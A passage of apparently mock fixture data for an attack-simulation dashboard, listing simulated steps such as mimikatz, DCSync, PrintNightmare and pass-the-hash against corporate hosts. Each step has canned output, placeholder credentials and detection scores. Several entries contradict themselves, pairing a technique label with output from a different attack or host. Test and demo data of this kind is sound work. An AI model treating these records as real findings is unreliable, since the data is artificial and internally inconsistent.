      node_credentials_found:['CORP\\ws40:P@ss40!'],
      node_accessed_files:['C:\\Logs\\WS-40-audit.log'],
    },
    { node_id:'s5100EP-a41', node_type:'ACTION', node_label:'psexec-lateral → API-41',
      node_status:'undetected', node_hostname:'API-41', node_ip:'10.10.2.50',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 11:22:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] psexec-lateral → API-41 (10.10.2.50)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\api41:P@ss41!'],
      node_accessed_files:['C:\\Logs\\API-41-audit.log'],
    },
    { node_id:'s5100EP-a42', node_type:'ACTION', node_label:'netexec-smb-spray → BACKUP-42',
      node_status:'undetected', node_hostname:'BACKUP-42', node_ip:'10.10.2.51',
      node_payload_name:'netexec-smb-spray', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 11:26:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] netexec-smb-spray → BACKUP-42 (10.10.2.51)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\backup42:P@ss42!'],
      node_accessed_files:['C:\\Logs\\BACKUP-42-audit.log'],
    },
    { node_id:'s5100EP-a43', node_type:'ACTION', node_label:'Rubeus-asktgt → MONITOR-43',
      node_status:'detected', node_hostname:'MONITOR-43', node_ip:'10.10.2.52',
      node_payload_name:'Rubeus-asktgt', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 11:31:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] Rubeus-asktgt → MONITOR-43 (10.10.2.52)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\monitor43:P@ss43!'],
      node_accessed_files:['C:\\Logs\\MONITOR-43-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e42',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a44', node_type:'ACTION', node_label:'netexec-smb-spray → VPN-44',
      node_status:'prevented', node_hostname:'VPN-44', node_ip:'10.10.2.53',
      node_payload_name:'netexec-smb-spray', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 11:36:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] netexec-smb-spray → VPN-44 (10.10.2.53)\n[-] BLOCKED by endpoint protection\n[!] Prevented at VPN-44',
      node_expectations:[{expectation_id:'s5100EP-e43',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a45', node_type:'ACTION', node_label:'CrackMapExec → SIEM-45',
      node_status:'detected', node_hostname:'SIEM-45', node_ip:'10.10.2.54',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 11:41:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] CrackMapExec → SIEM-45 (10.10.2.54)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\siem45:P@ss45!'],
      node_accessed_files:['C:\\Logs\\SIEM-45-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e44',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a46', node_type:'ACTION', node_label:'psexec-lateral → WEB-46',
      node_status:'undetected', node_hostname:'WEB-46', node_ip:'10.10.2.55',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 11:47:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] psexec-lateral → WEB-46 (10.10.2.55)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\web46:P@ss46!'],
      node_accessed_files:['C:\\Logs\\WEB-46-audit.log'],
    },
    { node_id:'s5100EP-a47', node_type:'ACTION', node_label:'DCSync-krbtgt → APP-47',
      node_status:'prevented', node_hostname:'APP-47', node_ip:'10.10.2.56',
      node_payload_name:'DCSync-krbtgt', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 11:51:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] DCSync-krbtgt → APP-47 (10.10.2.56)\n[-] BLOCKED by endpoint protection\n[!] Prevented at APP-47',
      node_expectations:[{expectation_id:'s5100EP-e46',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a48', node_type:'ACTION', node_label:'psexec-lateral → DB-48',
      node_status:'undetected', node_hostname:'DB-48', node_ip:'10.10.2.57',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 11:57:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] psexec-lateral → DB-48 (10.10.2.57)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\db48:P@ss48!'],
      node_accessed_files:['C:\\Logs\\DB-48-audit.log'],
    },
    { node_id:'s5100EP-a49', node_type:'ACTION', node_label:'nmap-discovery → FILE-49',
      node_status:'undetected', node_hostname:'FILE-49', node_ip:'10.10.2.58',
      node_payload_name:'nmap-discovery', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 12:01:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] nmap-discovery → FILE-49 (10.10.2.58)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\file49:P@ss49!'],
      node_accessed_files:['C:\\Logs\\FILE-49-audit.log'],
    },
    { node_id:'s5100EP-a50', node_type:'ACTION', node_label:'psexec-lateral → MAIL-50',
      node_status:'undetected', node_hostname:'MAIL-50', node_ip:'10.10.2.59',
      node_payload_name:'psexec-lateral', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 12:06:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] psexec-lateral → MAIL-50 (10.10.2.59)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\mail50:P@ss50!'],
      node_accessed_files:['C:\\Logs\\MAIL-50-audit.log'],
    },
    { node_id:'s5100EP-a51', node_type:'ACTION', node_label:'reg-sam-dump → JUMP-51',
      node_status:'detected', node_hostname:'JUMP-51', node_ip:'10.10.2.60',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 12:13:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] reg-sam-dump → JUMP-51 (10.10.2.60)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\jump51:P@ss51!'],
      node_accessed_files:['C:\\Logs\\JUMP-51-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e50',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a52', node_type:'ACTION', node_label:'DCSync-krbtgt → PRINT-52',
      node_status:'detected', node_hostname:'PRINT-52', node_ip:'10.10.2.61',
      node_payload_name:'DCSync-krbtgt', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 12:18:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] DCSync-krbtgt → PRINT-52 (10.10.2.61)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\print52:P@ss52!'],
      node_accessed_files:['C:\\Logs\\PRINT-52-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e51',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a53', node_type:'ACTION', node_label:'mimikatz-sekurlsa → DNS-53',
      node_status:'undetected', node_hostname:'DNS-53', node_ip:'10.10.2.62',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 12:20:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] mimikatz-sekurlsa → DNS-53 (10.10.2.62)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\dns53:P@ss53!'],
      node_accessed_files:['C:\\Logs\\DNS-53-audit.log'],
    },
    { node_id:'s5100EP-a54', node_type:'ACTION', node_label:'PrintNightmare-LPE → DC-54',
      node_status:'undetected', node_hostname:'DC-54', node_ip:'10.10.2.63',
      node_payload_name:'PrintNightmare-LPE', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 12:25:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] PrintNightmare-LPE → DC-54 (10.10.2.63)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\dc54:P@ss54!'],
      node_accessed_files:['C:\\Logs\\DC-54-audit.log'],
    },
    { node_id:'s5100EP-a55', node_type:'ACTION', node_label:'mimikatz-sekurlsa → WS-55',
      node_status:'undetected', node_hostname:'WS-55', node_ip:'10.10.2.64',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 12:30:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] mimikatz-sekurlsa → WS-55 (10.10.2.64)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\ws55:P@ss55!'],
      node_accessed_files:['C:\\Logs\\WS-55-audit.log'],
    },
    { node_id:'s5100EP-a56', node_type:'ACTION', node_label:'Rubeus-asktgt → API-56',
      node_status:'undetected', node_hostname:'API-56', node_ip:'10.10.2.65',
      node_payload_name:'Rubeus-asktgt', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 12:38:00 UTC', node_agent:'openaev',
      node_terminal_output:`[nuclei] CVE-2020-1472 (Zerologon) [critical]
[*] Target: DC-56 (10.10.3.5)
[+] Domain Controller detected
[+] Netlogon brute-force - machine account reset
[+] DCSync: all domain hashes dumped
[+] Domain fully compromised`,
      node_credentials_found:['CORP\\api56:P@ss56!'],
      node_accessed_files:['C:\\Logs\\API-56-audit.log'],
    },
    { node_id:'s5100EP-a57', node_type:'ACTION', node_label:'mimikatz-sekurlsa → BACKUP-57',
      node_status:'undetected', node_hostname:'BACKUP-57', node_ip:'10.10.2.66',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 12:43:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] mimikatz-sekurlsa → BACKUP-57 (10.10.2.66)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\backup57:P@ss57!'],
      node_accessed_files:['C:\\Logs\\BACKUP-57-audit.log'],
    },
    { node_id:'s5100EP-a58', node_type:'ACTION', node_label:'mimikatz-sekurlsa → MONITOR-58',
      node_status:'detected', node_hostname:'MONITOR-58', node_ip:'10.10.2.67',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 12:46:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] mimikatz-sekurlsa → MONITOR-58 (10.10.2.67)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\monitor58:P@ss58!'],
      node_accessed_files:['C:\\Logs\\MONITOR-58-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e57',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a59', node_type:'ACTION', node_label:'CrackMapExec → VPN-59',
      node_status:'prevented', node_hostname:'VPN-59', node_ip:'10.10.2.68',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 12:53:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] CrackMapExec → VPN-59 (10.10.2.68)\n[-] BLOCKED by endpoint protection\n[!] Prevented at VPN-59',
      node_expectations:[{expectation_id:'s5100EP-e58',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a60', node_type:'ACTION', node_label:'CrackMapExec → SIEM-60',
      node_status:'undetected', node_hostname:'SIEM-60', node_ip:'10.10.2.69',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 12:56:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] CrackMapExec → SIEM-60 (10.10.2.69)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\siem60:P@ss60!'],
      node_accessed_files:['C:\\Logs\\SIEM-60-audit.log'],
    },
    { node_id:'s5100EP-a61', node_type:'ACTION', node_label:'psexec-lateral → WEB-61',
      node_status:'undetected', node_hostname:'WEB-61', node_ip:'10.10.3.20',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 13:03:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] psexec-lateral → WEB-61 (10.10.3.20)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\web61:P@ss61!'],
      node_accessed_files:['C:\\Logs\\WEB-61-audit.log'],
    },
    { node_id:'s5100EP-a62', node_type:'ACTION', node_label:'Rubeus-asktgt → APP-62',
      node_status:'prevented', node_hostname:'APP-62', node_ip:'10.10.3.21',
      node_payload_name:'Rubeus-asktgt', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 13:06:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] Rubeus-asktgt → APP-62 (10.10.3.21)\n[-] BLOCKED by endpoint protection\n[!] Prevented at APP-62',
      node_expectations:[{expectation_id:'s5100EP-e61',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a63', node_type:'ACTION', node_label:'reg-sam-dump → DB-63',
      node_status:'prevented', node_hostname:'DB-63', node_ip:'10.10.3.22',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 13:13:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] reg-sam-dump → DB-63 (10.10.3.22)\n[-] BLOCKED by endpoint protection\n[!] Prevented at DB-63',
      node_expectations:[{expectation_id:'s5100EP-e62',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a64', node_type:'ACTION', node_label:'mimikatz-sekurlsa → FILE-64',
      node_status:'undetected', node_hostname:'FILE-64', node_ip:'10.10.3.23',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 13:15:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] mimikatz-sekurlsa → FILE-64 (10.10.3.23)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\file64:P@ss64!'],
      node_accessed_files:['C:\\Logs\\FILE-64-audit.log'],
    },
    { node_id:'s5100EP-a65', node_type:'ACTION', node_label:'wdigest-dump → MAIL-65',
      node_status:'undetected', node_hostname:'MAIL-65', node_ip:'10.10.3.24',
      node_payload_name:'wdigest-dump', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 13:20:00 UTC', node_agent:'palo_alto',
      node_terminal_output:`Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-20 08:00 UTC
Nmap scan report for JUMP-65 (10.10.3.14)
Host is up (0.003s latency).
22/tcp   open  ssh
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds`,
      node_credentials_found:['CORP\\mail65:P@ss65!'],
      node_accessed_files:['C:\\Logs\\MAIL-65-audit.log'],
    },
    { node_id:'s5100EP-a66', node_type:'ACTION', node_label:'reg-sam-dump → JUMP-66',
      node_status:'detected', node_hostname:'JUMP-66', node_ip:'10.10.3.25',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 13:28:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] reg-sam-dump → JUMP-66 (10.10.3.25)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\jump66:P@ss66!'],
      node_accessed_files:['C:\\Logs\\JUMP-66-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e65',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a67', node_type:'ACTION', node_label:'PrintNightmare-LPE → PRINT-67',
      node_status:'prevented', node_hostname:'PRINT-67', node_ip:'10.10.3.26',
      node_payload_name:'PrintNightmare-LPE', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 13:30:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] PrintNightmare-LPE → PRINT-67 (10.10.3.26)\n[-] BLOCKED by endpoint protection\n[!] Prevented at PRINT-67',
      node_expectations:[{expectation_id:'s5100EP-e66',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a68', node_type:'ACTION', node_label:'reg-sam-dump → DNS-68',
      node_status:'undetected', node_hostname:'DNS-68', node_ip:'10.10.3.27',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 13:35:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] reg-sam-dump → DNS-68 (10.10.3.27)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\dns68:P@ss68!'],
      node_accessed_files:['C:\\Logs\\DNS-68-audit.log'],
    },
    { node_id:'s5100EP-a69', node_type:'ACTION', node_label:'mimikatz-sekurlsa → DC-69',
      node_status:'detected', node_hostname:'DC-69', node_ip:'10.10.3.28',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 13:43:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] mimikatz-sekurlsa → DC-69 (10.10.3.28)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\dc69:P@ss69!'],
      node_accessed_files:['C:\\Logs\\DC-69-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e68',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a70', node_type:'ACTION', node_label:'PowerView-recon → WS-70',
      node_status:'undetected', node_hostname:'WS-70', node_ip:'10.10.3.29',
      node_payload_name:'PowerView-recon', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 13:46:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] PowerView-recon → WS-70 (10.10.3.29)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\ws70:P@ss70!'],
      node_accessed_files:['C:\\Logs\\WS-70-audit.log'],
    },
    { node_id:'s5100EP-a71', node_type:'ACTION', node_label:'pass-the-hash → API-71',
      node_status:'detected', node_hostname:'API-71', node_ip:'10.10.3.30',
      node_payload_name:'pass-the-hash', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 13:50:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] pass-the-hash → API-71 (10.10.3.30)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\api71:P@ss71!'],
      node_accessed_files:['C:\\Logs\\API-71-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e70',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a72', node_type:'ACTION', node_label:'reg-sam-dump → BACKUP-72',
      node_status:'undetected', node_hostname:'BACKUP-72', node_ip:'10.10.3.31',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 13:56:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:`[nuclei] CVE-2021-44228 (Log4Shell) [critical]
[*] Target: MONITOR-72 (10.10.3.21)
[+] Vulnerable log4j-2.14.1 detected
[+] JNDI injection via User-Agent header
[+] DNS callback confirmed RCE
[+] Shell obtained as root`,
      node_credentials_found:['CORP\\backup72:P@ss72!'],
      node_accessed_files:['C:\\Logs\\BACKUP-72-audit.log'],
    },
    { node_id:'s5100EP-a73', node_type:'ACTION', node_label:'PrintNightmare-LPE → MONITOR-73',
      node_status:'undetected', node_hostname:'MONITOR-73', node_ip:'10.10.3.32',
      node_payload_name:'PrintNightmare-LPE', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 14:01:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] PrintNightmare-LPE → MONITOR-73 (10.10.3.32)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\monitor73:P@ss73!'],
      node_accessed_files:['C:\\Logs\\MONITOR-73-audit.log'],
    },
    { node_id:'s5100EP-a74', node_type:'ACTION', node_label:'wdigest-dump → VPN-74',
      node_status:'prevented', node_hostname:'VPN-74', node_ip:'10.10.3.33',
      node_payload_name:'wdigest-dump', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 14:06:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] wdigest-dump → VPN-74 (10.10.3.33)\n[-] BLOCKED by endpoint protection\n[!] Prevented at VPN-74',
      node_expectations:[{expectation_id:'s5100EP-e73',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a75', node_type:'ACTION', node_label:'netexec-smb-spray → SIEM-75',
      node_status:'undetected', node_hostname:'SIEM-75', node_ip:'10.10.3.34',
      node_payload_name:'netexec-smb-spray', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 14:13:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] netexec-smb-spray → SIEM-75 (10.10.3.34)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\siem75:P@ss75!'],
      node_accessed_files:['C:\\Logs\\SIEM-75-audit.log'],
    },
    { node_id:'s5100EP-a76', node_type:'ACTION', node_label:'reg-sam-dump → WEB-76',
      node_status:'undetected', node_hostname:'WEB-76', node_ip:'10.10.3.35',
      node_payload_name:'reg-sam-dump', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 14:16:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] reg-sam-dump → WEB-76 (10.10.3.35)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\web76:P@ss76!'],
      node_accessed_files:['C:\\Logs\\WEB-76-audit.log'],
    },
    { node_id:'s5100EP-a77', node_type:'ACTION', node_label:'wdigest-dump → APP-77',
      node_status:'undetected', node_hostname:'APP-77', node_ip:'10.10.3.36',
      node_payload_name:'wdigest-dump', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 14:22:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] wdigest-dump → APP-77 (10.10.3.36)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\app77:P@ss77!'],
      node_accessed_files:['C:\\Logs\\APP-77-audit.log'],
    },
    { node_id:'s5100EP-a78', node_type:'ACTION', node_label:'reg-sam-dump → DB-78',
      node_status:'prevented', node_hostname:'DB-78', node_ip:'10.10.3.37',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 14:26:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] reg-sam-dump → DB-78 (10.10.3.37)\n[-] BLOCKED by endpoint protection\n[!] Prevented at DB-78',
      node_expectations:[{expectation_id:'s5100EP-e77',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a79', node_type:'ACTION', node_label:'CrackMapExec → FILE-79',
      node_status:'undetected', node_hostname:'FILE-79', node_ip:'10.10.3.38',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 14:31:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] CrackMapExec → FILE-79 (10.10.3.38)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\file79:P@ss79!'],
      node_accessed_files:['C:\\Logs\\FILE-79-audit.log'],
    },
    { node_id:'s5100EP-a80', node_type:'ACTION', node_label:'Rubeus-asktgt → MAIL-80',
      node_status:'prevented', node_hostname:'MAIL-80', node_ip:'10.10.3.39',
      node_payload_name:'Rubeus-asktgt', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 14:35:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:`Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-20 08:00 UTC
Nmap scan report for WEB-80 (10.10.3.29)
Host is up (0.003s latency).
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds`,
      node_expectations:[{expectation_id:'s5100EP-e79',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a81', node_type:'ACTION', node_label:'wdigest-dump → JUMP-81',
      node_status:'undetected', node_hostname:'JUMP-81', node_ip:'10.10.4.10',
      node_payload_name:'wdigest-dump', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 14:40:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] wdigest-dump → JUMP-81 (10.10.4.10)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\jump81:P@ss81!'],
      node_accessed_files:['C:\\Logs\\JUMP-81-audit.log'],
    },
    { node_id:'s5100EP-a82', node_type:'ACTION', node_label:'PowerView-recon → PRINT-82',
      node_status:'detected', node_hostname:'PRINT-82', node_ip:'10.10.4.11',
      node_payload_name:'PowerView-recon', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 14:47:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] PowerView-recon → PRINT-82 (10.10.4.11)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\print82:P@ss82!'],
      node_accessed_files:['C:\\Logs\\PRINT-82-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e81',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a83', node_type:'ACTION', node_label:'reg-sam-dump → DNS-83',
      node_status:'undetected', node_hostname:'DNS-83', node_ip:'10.10.4.12',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 14:50:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] reg-sam-dump → DNS-83 (10.10.4.12)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\dns83:P@ss83!'],
      node_accessed_files:['C:\\Logs\\DNS-83-audit.log'],
    },
    { node_id:'s5100EP-a84', node_type:'ACTION', node_label:'DCSync-krbtgt → DC-84',
      node_status:'detected', node_hostname:'DC-84', node_ip:'10.10.4.13',
      node_payload_name:'DCSync-krbtgt', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 14:58:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] DCSync-krbtgt → DC-84 (10.10.4.13)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\dc84:P@ss84!'],
      node_accessed_files:['C:\\Logs\\DC-84-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e83',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a85', node_type:'ACTION', node_label:'wdigest-dump → WS-85',
      node_status:'undetected', node_hostname:'WS-85', node_ip:'10.10.4.14',
      node_payload_name:'wdigest-dump', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 15:01:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] wdigest-dump → WS-85 (10.10.4.14)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\ws85:P@ss85!'],
      node_accessed_files:['C:\\Logs\\WS-85-audit.log'],
    },
    { node_id:'s5100EP-a86', node_type:'ACTION', node_label:'SharpHound → API-86',
      node_status:'undetected', node_hostname:'API-86', node_ip:'10.10.4.15',
      node_payload_name:'SharpHound', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 15:06:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] SharpHound → API-86 (10.10.4.15)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\api86:P@ss86!'],
